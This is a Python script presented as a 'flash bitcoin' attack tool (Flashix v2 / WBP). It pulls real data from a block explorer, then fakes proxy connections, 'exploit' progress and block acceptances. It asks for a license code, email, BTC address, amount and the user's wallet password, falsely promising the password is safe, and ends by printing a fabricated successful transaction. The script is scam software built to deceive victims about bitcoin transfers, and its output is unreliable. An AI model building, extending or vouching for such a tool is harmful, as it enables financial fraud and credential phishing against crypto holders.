import random
import time
from rich import box
from rich.console import Console
from rich.table import Table
import requests
from colorama import Fore, Style
from lxml import html
from rich.progress import track, Progress
from time import sleep

from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table

mmdrzaflashix = '''


░██       ░██ ░████████   ░█████████     ░██████████  ░██████     ░██████   ░██             ░██████        ░████   
░██       ░██ ░██    ░██  ░██     ░██        ░██     ░██   ░██   ░██   ░██  ░██            ░██   ░██      ░██ ░██  
░██  ░██  ░██ ░██    ░██  ░██     ░██        ░██    ░██     ░██ ░██     ░██ ░██                  ░██     ░██ ░████ 
░██ ░████ ░██ ░████████   ░█████████         ░██    ░██     ░██ ░██     ░██ ░██              ░█████      ░██░██░██ 
░██░██ ░██░██ ░██     ░██ ░██                ░██    ░██     ░██ ░██     ░██ ░██             ░██          ░████ ░██ 
░████   ░████ ░██     ░██ ░██                ░██     ░██   ░██   ░██   ░██  ░██            ░██            ░██ ░██  
░███     ░███ ░█████████  ░██                ░██      ░██████     ░██████   ░██████████    ░████████ ░██   ░████   


⭕️👉 Powered By @WBPAY             
⭕️👉 Channel : @WBPAY              
⭕️👉 Wwbsite : WBPAY               
⭕️👉 Github.Com/ WBPAY             
⭕️👉 Dev.to/@WBPAY                 
'''

print(Fore.YELLOW + mmdrzaflashix)
job_progress1 = Progress(
    "{task.description}",
    SpinnerColumn(),
    BarColumn(),
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
)
job1 = job_progress1.add_task("[gold1 on grey17]Cooking", total=100)
job2 = job_progress1.add_task("[white on grey19]Baking", total=200)
job3 = job_progress1.add_task("[red on grey17]Mixing", total=400)

# compute total safely (handle None)
total = sum((t.total or 0) for t in job_progress1.tasks)
if total == 0:
    total = 1
overall_progress1 = Progress()
overall_task = overall_progress1.add_task("Start Script", total=int(total))

progress_table = Table.grid()
progress_table.add_row(
    Panel.fit(
        overall_progress1, title="Starting", border_style="green", padding=(2, 2)
    ),
    Panel.fit(job_progress1, title="[b]Processes", border_style="gold1", padding=(1, 2)),
)

with Live(progress_table, refresh_per_second=2):
    while not overall_progress1.finished:
        sleep(0.01)
        for job in list(job_progress1.tasks):
            if not job.finished:
                job_progress1.advance(job.id, random.randint(1, 3))

        completed = sum((t.completed or 0) for t in job_progress1.tasks)
        overall_progress1.update(overall_task, completed=completed)
# ======================[ FLASH_CORE ]=========================

txid = 'd515e301ab955b830ba95bb8dcdfa6c96b71e77b594c19331165a2ce83bd14ce'
block_number_hex = '00000000000000000001d51f9d18d97cf8bd9d52ccb192725b7dcee1fa8d7e30'
sender = 'bc1q8xh39klxvya6k8c0ekeg3tfth0cnpd8fhamthf'

confer = [154]
# =============================================================
link = 'https://bitcoin.atomicwallet.io/tx/' + txid
try:
    respone = requests.get(link, timeout=10)
    byte_string = respone.content
    source_code = html.fromstring(byte_string)
except Exception:
    source_code = html.fromstring("<html></html>")

link_status = 'https://bitcoin.atomicwallet.io/status'
try:
    res_status = requests.get(link_status, timeout=10)
    byteStatus = res_status.content
    sourceStatus = html.fromstring(byteStatus)
except Exception:
    sourceStatus = html.fromstring("<html></html>")

# -----------------------------------------
paxStatus = '/html/body/main/div/div/div[1]/table/tbody/tr[3]/td[2]'
paxsync = '/html/body/main/div/div/div[1]/table/tbody/tr[4]/td[2]'
paxLastB = '/html/body/main/div/div/div[1]/table/tbody/tr[5]/td[2]'
paxupLastb = '/html/body/main/div/div/div[1]/table/tbody/tr[6]/td[2]'
paxSyncMe = '/html/body/main/div/div/div[1]/table/tbody/tr[7]/td[2]'
paxSizeD = '/html/body/main/div/div/div[1]/table/tbody/tr[10]/td[2]'
paxProto = '/html/body/main/div/div[2]/table/tbody/tr[4]/td[2]'
pathfee = '/html/body/main/div/div[2]/table/tbody/tr[6]/td[2]'
pathinput = '/html/body/main/div/div[2]/table/tbody/tr[4]/td[2]'
pathblock = '/html/body/main/div/div[2]/table/tbody/tr[3]/td[2]/a'
hexblock = '/html/body/main/div/div[2]/table/tbody/tr[2]/td[2]'
timexxx = '/html/body/main/div/div[2]/table/tbody/tr[1]/td[2]'
sendWallet = '/html/body/main/div/div[3]/div/div[2]/div[3]/div/table/tbody'
btcSection = '/html/body/main/div/div[3]/div/div[2]/div[1]/div/table/tbody'
conferpath = '/html/body/main/div/div[3]/div/div[3]/div[2]/span[1]'
pathFrom = '/html/body/main/div/div[3]/div/div[2]/div[1]/div/table/tbody/tr/td/span[1]'
# -----------------------------------------

def safe_xpath(tree, xpath):
    try:
        nodes = tree.xpath(xpath)
        if nodes:
            return nodes[0].text_content().strip()
    except Exception:
        pass
    return ""

treeconfer = source_code.xpath(conferpath) if source_code is not None else []
treebtcSection = source_code.xpath(btcSection) if source_code is not None else []
treeSend = source_code.xpath(sendWallet) if source_code is not None else []
treeTime = source_code.xpath(timexxx) if source_code is not None else []
treehex = source_code.xpath(hexblock) if source_code is not None else []
treeBlock = source_code.xpath(pathblock) if source_code is not None else []
tree_input = source_code.xpath(pathinput) if source_code is not None else []
tree_fee = source_code.xpath(pathfee) if source_code is not None else []
treeProto = sourceStatus.xpath(paxProto) if sourceStatus is not None else []
treeSize = sourceStatus.xpath(paxSizeD) if sourceStatus is not None else []
treeSync = sourceStatus.xpath(paxsync) if sourceStatus is not None else []
treeVersion = sourceStatus.xpath(paxStatus) if sourceStatus is not None else []
treeLastB = sourceStatus.xpath(paxLastB) if sourceStatus is not None else []
treeLastBup = sourceStatus.xpath(paxupLastb) if sourceStatus is not None else []
treeSyncMem = sourceStatus.xpath(paxSyncMe) if sourceStatus is not None else []
treeFrom = source_code.xpath(pathFrom) if source_code is not None else []

senderFrom = safe_xpath(source_code, pathFrom)
conferReport = safe_xpath(source_code, conferpath)
btcSectionAll = safe_xpath(source_code, btcSection)
sendWalletAll = safe_xpath(source_code, sendWallet)
txTimeCreate = safe_xpath(source_code, timexxx)
hexblock = safe_xpath(source_code, hexblock)
BlockHeight = safe_xpath(source_code, pathblock)
TotalBTCReport = safe_xpath(source_code, pathinput)
feeReport = safe_xpath(source_code, pathfee)
# ------
ProtocolVer = safe_xpath(sourceStatus, paxProto)
SizeOnDiskRep = safe_xpath(sourceStatus, paxSizeD)
SyncMempoolRep = safe_xpath(sourceStatus, paxSyncMe)
LastUpBlockRep = safe_xpath(sourceStatus, paxupLastb)
verReport = safe_xpath(sourceStatus, paxStatus)
syncReport = safe_xpath(sourceStatus, paxsync)
LastBlockReport = safe_xpath(sourceStatus, paxLastB)

# ==========================================================


mmdrzaxlog = '''
               
'''


# ======================[ FLASH_CORE]=========================

# =============================================================
green = Fore.GREEN
red = Fore.RED
white = Fore.WHITE
yellow = Fore.YELLOW
blue = Fore.BLUE
bred = '\033[1;31m'
bwhite = '\033[1;37m'
bgreen = '\033[1;32m'
reset1 = Style.RESET_ALL
resetc = Style.RESET_ALL


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    return addr[0] + d + addr[1] + d + addr[2] + d + addr[3]


# =======================================================================
def pooling():
    names = ['SlushPool', 'AntPool', 'F2Pool', 'Unknown', '+ViaBTC', '+ Poolin']
    select_pool = str(random.choice(names))
    return select_pool


# ========================================================================

def hexers():
    choices = '0123456789abcdefABCDEF'
    return ''.join(random.choice(choices) for _ in range(44))


# =====================================================================


mmdrzalog = ('\n')

print(green + mmdrzaflashix)
print(Fore.RED + 'ℹ️ WBP MONETIZED TOOL VERSION 2.0 READY FOR ATTACKING ...')

with Progress() as progress:
    task1 = progress.add_task("[green]Set Config...", total=1000)
    task2 = progress.add_task("[yellow]Processing...", total=1000)
    task3 = progress.add_task("[green]Cooking...", total=1000)
    task4 = progress.add_task("[yellow]Spoofing...", total=1000)
    task5 = progress.add_task("[green]Proxy Config...", total=1000)
    task6 = progress.add_task("[yellow]eXploite...", total=1000)
    while not progress.finished:
        progress.update(task1, advance=3)
        progress.update(task2, advance=15)
        progress.update(task3, advance=14)
        progress.update(task4, advance=12)
        progress.update(task5, advance=9)
        progress.update(task6, advance=6)
        time.sleep(0.01)
# ======================[ FLASH_CORE]=========================

# ==========================================================
print(Fore.YELLOW + '---------------------------------------------------')
print(Fore.WHITE + "🔁 New Rule Create For Connection Firewall's")
print(Fore.YELLOW + '---------------------------------------------------')
print(Fore.YELLOW + "📥 Received Config file From Dedicate: ", spoofer(), "\n")
xrangeblock = random.randint(43, 78)


def process_data():
    time.sleep(0.05)


for _ in track(range(100), description='[green]Received DATA'):
    process_data()
print(Fore.YELLOW + '---------------------------------------------------')

# ======================[ FLASH_CORE]=========================
z = 1

while z <= 91:
    print(Fore.YELLOW + '[' + Fore.RED + str(
        z) + Fore.YELLOW + '] ' + 'Connected' + ' = ' + Fore.WHITE + spoofer() + Style.RESET_ALL)
    z += 1
    time.sleep(0.05)
    continue
print(Fore.RED + '========================================================')


def process_data():
    time.sleep(0.05)


for _ in track(range(100), description='[green]Received DATA'):
    process_data()
print(Fore.RED + '========================================================' + Style.RESET_ALL)
print(Fore.GREEN + 'Connect Successfully in 91 Proxy Server .' + Style.RESET_ALL)
print(Fore.RED + '========================================================')
print(Fore.YELLOW + '--- Last Update: ' + Fore.WHITE + str(LastBlockReport))
print(Fore.YELLOW + '--- Protocol Version : ' + Fore.WHITE + str(ProtocolVer))
print(Fore.YELLOW + '--- SizeOnDisk : ' + Fore.WHITE + str(SizeOnDiskRep))
print(Fore.YELLOW + '--- Sync Mempool : ' + Fore.WHITE + str(SyncMempoolRep))
print(Fore.YELLOW + '--- Last Attack No:' + Fore.WHITE + str(LastUpBlockRep))
print(Fore.YELLOW + '--- VersionCommit:' + Fore.WHITE + str(verReport))
print(Fore.YELLOW + '--- Sync:' + Fore.WHITE + str(syncReport))
print(Fore.YELLOW + '--- Last UP Block:' + Fore.WHITE + str(LastBlockReport))
print(Fore.RED + '========================================================')

print(Fore.YELLOW + '\n*** GBP Account Verification  :\n' + Style.RESET_ALL)
print(Fore.WHITE + '[1]' + Fore.RED + ' PLEASE ENTER YOUR LICENSE CODE ' + Style.RESET_ALL)
print(Fore.WHITE + '[2]' + Fore.RED + ' PLEASE KEEP IN YOUR MIND WITHOUT LICENSE CODE WBP TOOL V2 NOT WORKS' + Style.RESET_ALL)
print(Fore.WHITE + '[3]' + Fore.RED + ' *** SCAMMER ALERT*** DEVOLOPER WBP_ADMIN OTHERS ALL SCAM' + Style.RESET_ALL)
time.sleep(0.3)
input_speed = input(Fore.YELLOW + 'PLEASE ENTER YOUR LICENSE CODE: ' + Style.RESET_ALL)
time.sleep(0.2)
print(Fore.RED + '========================================================')
input_wallet = input(Fore.RED + 'GBP EMAIL: ')
print(Fore.RED + '========================================================')
time.sleep(0.2)
count_txid = input(Fore.GREEN + 'Your BTC Address :')
print(Fore.RED + '========================================================')
time.sleep(0.2)
TotalBTCReport = input(Fore.WHITE + 'AMOUNT IN BTC:')
print(Fore.RED + '========================================================')
time.sleep(0.2)
print(
    Fore.RED + 'WE DO NO SHARE YOUR PASSWORD TO ANY 3D PARTY,\n YOUR PASSWORD IS SAFE.... \n' + Fore.LIGHTRED_EX + '(YOUR PASSWORD IS REQUIRED FOR CONNCET TO THE WALLET BALANCE )')
count_btc = input(Fore.YELLOW + 'YOUR WALLET PASSWORD ? = ' + Style.RESET_ALL)
print(Fore.RED + '========================================================')
time.sleep(0.2)
print(Fore.GREEN + 'Request to send ' + Fore.WHITE + str(
    TotalBTCReport) + Fore.GREEN + ' bitcoins in ' + Fore.WHITE + str(
    count_txid) + Fore.GREEN + ' TRANSACTION IN ' + Fore.WHITE + str(
    count_btc) + Fore.GREEN + ' VARIABLE SECTIONS TO THIS ADDRESS ' + Fore.YELLOW + str(
    input_wallet) + Fore.GREEN + ' WALLETS WITH SPEED OF ' + Fore.YELLOW + str(
    input_speed) + Fore.YELLOW + '.\n(IF You Want To Continue & Confirm The Information ,', Fore.WHITE, 'ENTER [YES])',
      Style.RESET_ALL, Fore.YELLOW, '.\nIF You DO Not APPROVE & NEED TO EDIT,', Fore.RED, ' ENTER [NO]: ')
input()
print(Fore.RED + '========================================================')
time.sleep(0.3)
print(Fore.WHITE + 'Send Your Request' + Fore.YELLOW + ' ... Please Wait ... ')
print(Fore.RED + '========================================================')


def process_data():
    time.sleep(0.05)


for _ in track(range(100), description='[green]Received DATA'):
    process_data()
print(Fore.RED + '========================================================')
print(Fore.GREEN, 'TRANSFER NUMBER : ', Fore.YELLOW, random.randint(59653000000021, 95860000000315))
print(Fore.RED + '========================================================')
time.sleep(0.3)
num = 1
while num <= 3:
    print(Fore.YELLOW + '========================================================')

    def process_data():
        time.sleep(0.01)

    print('')
    for _ in track(range(100), description='[green]Received DATA'):
        process_data()
    block_number_r = random.randint(721643, 779090)
   # print(Fore.YELLOW, str(num), Fore.RED, ' Request Pool ', Fore.YELLOW, pooling(), Fore.RED, 'INPUT ', Fore.YELLOW,
   # str(block_number_r), Fore.RED, ' ~ [400 - [REJECT]')
   # print(Fore.YELLOW, 'BLOCK : 00000000000000000001' + hexers())
    row_styles = ["on grey15", "on grey11", "on grey15", "on grey11"]  # T his is a bit messy...?

    table = Table(title="", title_style="gold1",
                  border_style="red", box=box.ROUNDED, row_styles=row_styles, show_edge=True,
                  header_style="on grey11 yellow")

    table.add_column(justify="right", style="bold", no_wrap=True)
    table.add_column("Request Information", style="red")

    table.add_row("Request Pool", pooling())
    table.add_row("INPUT", str(block_number_r))
    table.add_row("Respone", "[REJECT] - (400)")
    table.add_row("BLOCK", "00000000000000000001" + hexers())

    console = Console()
    console.print(table)
    num += 1
    time.sleep(0.5)
   # print(Fore.YELLOW + '========================================================')
    continue

numa = 1
while numa <= 25:

    print(Fore.YELLOW + '\n')

#
    blockacceppt = random.randint(8888888888, 9888888888)
    row_styles = ["on grey15", "on grey11", "on grey15", "on grey11"]  # T his is a bit messy...?

    table = Table(title="", title_style="green",
                  border_style="green", box=box.ROUNDED, row_styles=row_styles, show_edge=True,
                  header_style="on grey11 gold1")

    table.add_column(justify="right", style="bold", no_wrap=True)
    table.add_column("Request Information", style="green")
    table.add_row("Accept No", str(numa))
    table.add_row("Reserved", pooling())
    table.add_row("Byte", str(blockacceppt))
    table.add_row("Respone", "[ACCEPT] - (200)")

    table.add_row("BLOCK", "00000000000000000001" + hexers())

    console = Console()
    console.print(table)
    numa += 1
    time.sleep(0.01)
    # print(Fore.YELLOW + '========================================================')
    continue

succ = '''
╔═╗╦ ╦╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗╦ ╦╦  ╦ ╦ ╦
╚═╗║ ║║  ║  ║╣ ╚═╗╚═╗╠╣ ║ ║║  ║ ╚╦╝
╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝╚  ╚═╝╩═╝╩═╝╩ 
'''

fake_inject = '''
░██       ░██ ░████████   ░█████████     ░██████████  ░██████     ░██████   ░██             ░██████        ░████   
░██       ░██ ░██    ░██  ░██     ░██        ░██     ░██   ░██   ░██   ░██  ░██            ░██   ░██      ░██ ░██  
░██  ░██  ░██ ░██    ░██  ░██     ░██        ░██    ░██     ░██ ░██     ░██ ░██                  ░██     ░██ ░████ 
░██ ░████ ░██ ░████████   ░█████████         ░██    ░██     ░██ ░██     ░██ ░██              ░█████      ░██░██░██ 
░██░██ ░██░██ ░██     ░██ ░██                ░██    ░██     ░██ ░██     ░██ ░██             ░██          ░████ ░██ 
░████   ░████ ░██     ░██ ░██                ░██     ░██   ░██   ░██   ░██  ░██            ░██            ░██ ░██  
░███     ░███ ░█████████  ░██                ░██      ░██████     ░██████   ░██████████    ░████████ ░██   ░████   

'''
# =============================================================
print(Fore.GREEN + 'Your Transaction Created Now...[successfully]')
print(Fore.LIGHTBLUE_EX + succ)
time.sleep(3)
print(Fore.GREEN + '============================================================')
time.sleep(1)
txlog = '''
        ┌───────────────────────────────┐
        │╺┳╸┏━┓┏━┓┏┓╻┏━┓┏━┓┏━╸╺┳╸╻┏━┓┏┓╻│
        │ ┃ ┣┳┛┣━┫┃┗┫┗━┓┣━┫┃   ┃ ┃┃ ┃┃┗┫│
        │ ╹ ╹┗╸╹ ╹╹ ╹┗━┛╹ ╹┗━┸ ╹ ╹┗━┛╹ ╹│
        └───────────────────────────────┘
--------------------------------------------------
'''
print(Fore.WHITE + txlog)
print(Fore.GREEN + 'Status = Successfully')
print(Fore.GREEN + 'Receiver Address = bc1qkj6hzrjvaeluwkdxzglnw6ccqpv3vvxuepavs4')
print(Fore.CYAN + 'BTC  = ', TotalBTCReport)
print(Fore.GREEN + 'TXID HASH = 68f207c27ef0a9876f7c54eec0e7170a9e1a5b9c5d9e422688aac883aeb1a2b2')
print(Fore.RED + '============================================================')
print(Fore.WHITE + 'You need further confirmation for this transaction???')
qas = input(Fore.WHITE + '[YES : 1 / NO : 0] (Default : 1):')
if int(qas) != 0:
    print(Fore.RED + '=============================================================')
    print(Fore.RED + fake_inject)
    print(Fore.YELLOW +
          'Connect in Fake BlockerX Server from INJECTION ...\nCreator and Programmer Mmdrza ------------------- OfficialWebSite: httpS:// FLASH_CORE ')
    print(Fore.RED + '=============================================================\n')
    input(Fore.WHITE + "               Random Create Block For Confirmation ? [YES/NO]\n               (Default per 10minutes Create = YES)")
    print(Fore.WHITE + '               6 Confirmation For This Transaction (RACE 10Minutes)...\n')
    print(Fore.RED + '=============================================================')
    time.sleep(1)


def process_data():
    time.sleep(0.5)


for _ in track(range(100), description='[green]Complete Confirmation'):
    process_data()
print(Fore.RED + '=============================================================')
time.sleep(1)
ds = 1


def Txers():
    choices = '0123456789abcdef'
    return ''.join(random.choice(choices) for _ in range(64))


logobtc = '''                                                                                               
 
░██       ░██ ░████████   ░█████████     ░██████████  ░██████     ░██████   ░██             ░██████        ░████   
░██       ░██ ░██    ░██  ░██     ░██        ░██     ░██   ░██   ░██   ░██  ░██            ░██   ░██      ░██ ░██  
░██  ░██  ░██ ░██    ░██  ░██     ░██        ░██    ░██     ░██ ░██     ░██ ░██                  ░██     ░██ ░████ 
░██ ░████ ░██ ░████████   ░█████████         ░██    ░██     ░██ ░██     ░██ ░██              ░█████      ░██░██░██ 
░██░██ ░██░██ ░██     ░██ ░██                ░██    ░██     ░██ ░██     ░██ ░██             ░██          ░████ ░██ 
░████   ░████ ░██     ░██ ░██                ░██     ░██   ░██   ░██   ░██  ░██            ░██            ░██ ░██  
░███     ░███ ░█████████  ░██                ░██      ░██████     ░██████   ░██████████    ░████████ ░██   ░████   

 =============================================================================
    ┌────────────────────────────────────────────────────────────────────┐
    │╻ ╻┏━┓╻ ╻┏━┓   ╺┳╸┏━┓┏━┓┏┓╻┏━┓┏━┓┏━╸╺┳╸╻┏━┓┏┓╻   ╺┳┓┏━╸╺┳╸┏━┓╻╻  ┏━┓│
    │┗┳┛┃ ┃┃ ┃┣┳┛    ┃ ┣┳┛┣━┫┃┗┫┗━┓┣━┫┃   ┃ ┃┃ ┃┃┗┫    ┃┃┣╸  ┃ ┣━┫┃┃  ┗━┓│
    │ ╹ ┗━┛┗━┛╹┗╸    ╹ ╹┗╸╹ ╹╹ ╹┗━┛╹ ╹┗━┸ ╹ ╹┗━┛╹ ╹   ╺┻┛┗━╸ ╹ ╹ ╹╹┗━╸┗━┛│
    └────────────────────────────────────────────────────────────────────┘     
'''

while ds <= 53:
    print(Fore.WHITE, str(ds), Fore.YELLOW, ' FM =', Fore.GREEN, Txers())
    ds += 1
    time.sleep(0.1)

print('{0}=========================================================================={1}'.format(Fore.RED,
                                                                                                Style.RESET_ALL))
print(Fore.YELLOW, 'Your Transaction Confirmation Start 10Minutes = 1Confirm ')
print(Fore.YELLOW, 'All 6 Confirmation On 60min ... After')
print(Fore.YELLOW,
      'We anticipate that it will take you up to an hour to receive at least 6 confirmations '
      'of your transaction. Please wait...........'
      ' (This number varies. It may be more or less. It depends on the network traffic)')

print(Fore.RED + '=============================================================')


def process_data():
    time.sleep(10)


for _ in track(range(6), description='[green]Received DATA'):
    process_data()

block_number_end = random.randint(721643, 779090)
print(Fore.WHITE + '=============================================================')
print(Fore.YELLOW + logobtc + Style.RESET_ALL)
tosender = str(sendWalletAll)
sender = str(senderFrom)
row_styles = ["on grey15", "on grey11", "on grey15", "on grey11"]  # T his is a bit messy...?

table = Table(title="\n\n------ Flashix v2 ------\nYour Transaction Details", title_style="gold1",border_style="green", box=box.ROUNDED, row_styles=row_styles, show_edge=True, header_style="on grey11 yellow")

table.add_column(justify="right", style="bold", no_wrap=True)
table.add_column("DETAILS TRANSACTION", style="green")

table.add_row("Transaction", str(txid))
table.add_row("Sender ", str(sender)[37:79] if sender else "(unknown)")
table.add_row("Total ", str(TotalBTCReport))
table.add_row("TargetWallet", str(input_wallet))
table.add_row("Fee", str(feeReport))
table.add_row("Conformation", str(conferReport))
table.add_row("Block", str(BlockHeight))
table.add_row("Pool", pooling())

console = Console()
console.print(table)

# conferReport = str(treeconfer[0].text_content())
# btcSectionAll = str(treebtcSection[0].text_content())
# sendWalletAll = str(treeSend[0].text_content())
# txTimeCreate = str(treeTime[0].text_content())
# hexblock = str(treehex[0].text_content())
# BlockHeight = str(treeBlock[0].text_content())
# TotalBTCReport = str(tree_input[0].text_content())
# feeReport = str(tree_fee[0].text_content())

print(Fore.YELLOW + str(mmdrzaxlog))
